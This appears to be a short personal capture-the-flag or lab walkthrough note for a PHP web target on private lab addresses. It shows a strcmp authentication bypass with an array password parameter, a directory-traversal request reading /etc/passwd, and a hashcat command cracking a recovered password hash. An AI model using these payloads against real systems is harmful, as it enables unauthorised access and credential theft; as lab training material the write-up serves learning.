# 4 :80 strcmp php

```
# code is given for a reason
# strcmp in php has a bypass vulnerability

Using https://www.doyler.net/security-not-included/bypassing-php-strcmp-abctf2016
# If $_GET[‘password’] equal to an empty array, then strcmp would return a NULL
# Due to some inherent weaknesses in PHP’s comparisons, NULL == 0 will return true

username=admin&password=pass
# BURP and change to >
username=admin&password[]=""

# success >
http://192.168.154.101/admin/dashboard.php

# there are different pages
# ping is interesting, as its running a commnd
# but its path is http://192.168.191.101/admin/dashboard.php?page=ping
# cannot supply command
# tried directory enumeration; nothing

# found log which has a param file=
# using that for directory traversal

POST /admin/dashboard.php?page=log HTTP/1.1
file=../../../../../etc/passwd

root:x:0:0:root:/root:/bin/bash
[truncated]
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
florianges:x:1000:1000:florianges:/home/florianges:/bin/bash
webadmin:$1$webadmin$3sXBxGUtDGIFAcnNTNhi6/:1001:1001:webadmin,,,:/home/webadmin:/bin/bash

$ hashcat -m 500 hash /usr/share/wordlists/rockyou.txt --show
$1$webadmin$3sXBxGUtDGIFAcnNTNhi6/:dragon
```
